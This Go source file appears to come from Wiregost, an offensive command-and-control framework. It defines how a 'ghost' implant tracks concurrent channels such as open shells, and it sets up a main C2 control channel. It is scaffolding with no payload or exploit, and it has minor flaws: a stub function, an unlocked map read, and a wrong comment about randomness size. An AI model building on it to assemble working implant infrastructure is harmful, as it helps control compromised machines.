package channels

import (
	"crypto/rand"
	"encoding/binary"
	"io"
	"sync"

	"github.com/sirupsen/logrus"

	corepb "github.com/maxlandon/wiregost/proto/v1/gen/go/ghost/core"
)

// Channels - All active channels for this implant.
var Channels *channels

// Channel - A goroutine object that is stored and manageable by the implant user.
// This is simply boilerplate to provide more explicit control on implant concurrent processes,
// such as open shells, programs running, etc...
// It is somehow the equivalent of jobs on the Wiregost server.
// This is also an attempt at mimicking the channels of Metasploit's Meterpreters, in which
// many different processes can be run concurrently, such as system shells.
// This can be used also when running concurrent processes such as routers: if we switch to a router's
// channels, we might get a shell refreshed with currently routed connections (like gost)
type Channel struct {
	ID          uint32             // ID of the Channel
	Name        string             // A name for this channel
	Type        corepb.ChannelType // This channel supports RPC or byte streams only.
	Main        bool               // Is this channel the main one, used from beginning to end for this implant ?
	Ready       bool               // Is this implant ready to be used ? Is the stream setup, etc ?
	Process     string             // Process name string (generally from ps)
	WorkingDir  string             // Channel current working directory (abstract)
	IsUsed      bool               // Equivalent value for the client-side
	Description string             // Further description for the process
	Err         string             // Potential errors caught
	JobCtrl     chan bool          // Asynchronous job control
	Stream      io.ReadWriteCloser // Stdin, stdout & stderr channels
	Log         *logrus.Entry      // A logger for this channel
}

// channels - A struct containing all the channels currently running in this ghost implant.
type channels struct {
	Active map[uint32]*Channel // All active channels
	mutex  *sync.Mutex         // Concurrency safety
}

// Add - Add a channel to list
func (c *channels) Add(ch *Channel) (err error) {
	c.mutex.Lock()
	c.Active[ch.ID] = ch
	c.mutex.Unlock()
	return
}

func (c *channels) Main() (main *Channel, err error) {
	for _, ch := range c.Active {
		if ch.Main {
			main = ch
			return
		}
	}
	return
}

// SetupChannels - Inits the goroutine management system of the implant.
func SetupChannels() {

	// We init the channel map
	Channels = &channels{
		Active: map[uint32]*Channel{},
		mutex:  &sync.Mutex{},
	}

	// Add create a main channel, not ready for use now
	StartMainChannel()
}

// New - Creates a new channel from a stream over which it will communicate.
func New(stream io.ReadWriteCloser) (ch *Channel, err error) {
	return
}

// StartMainChannel - Init the channel that will be used for all core functionality from implant
// startup to kill/sleep. We might later use other functions for starting specialized channels.
func StartMainChannel() (err error) {

	main := &Channel{
		ID:          NewID(),
		Name:        "main",
		Type:        corepb.ChannelType_CORE_CHAN,
		Description: "main C2 channel for implant control",
		Ready:       false, // This channel is not ready to work, no stream bound yet.
		Log:         nil,   // We have to change that, derive log from core or something.
	}

	Channels.Add(main)

	return
}

// NewID - Generate random ID of randomIDSize bytes
func NewID() uint32 {
	randBuf := make([]byte, 8) // 64 bytes of randomness
	rand.Read(randBuf)
	return binary.LittleEndian.Uint32(randBuf)
}
